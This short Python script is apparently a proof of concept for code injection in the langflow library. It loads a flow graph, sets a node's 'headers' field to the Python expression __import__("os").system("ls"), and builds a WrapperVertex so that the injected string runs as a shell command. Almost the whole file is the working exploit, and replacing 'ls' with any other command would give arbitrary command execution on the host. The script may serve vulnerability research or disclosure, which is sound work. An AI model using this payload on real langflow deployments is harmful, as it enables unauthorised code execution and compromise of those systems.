import langflow
import json

with open("basic_example.json", "r") as f:
    graph = json.load(f)

node = graph["data"]["nodes"][0]

headers = {'required': True, 'placeholder': '', 'show': True, 'multiline': True, 'value': '__import__("os").system("ls")', 'password': False, 'name': 'headers', 'advanced': False, 'info': '', 'type': 'str', 'list': False}

node["data"]["node"]["template"]["headers"] = headers


x = langflow.graph.vertex.types.WrapperVertex(node)
x._build_params()
x.build(force=True)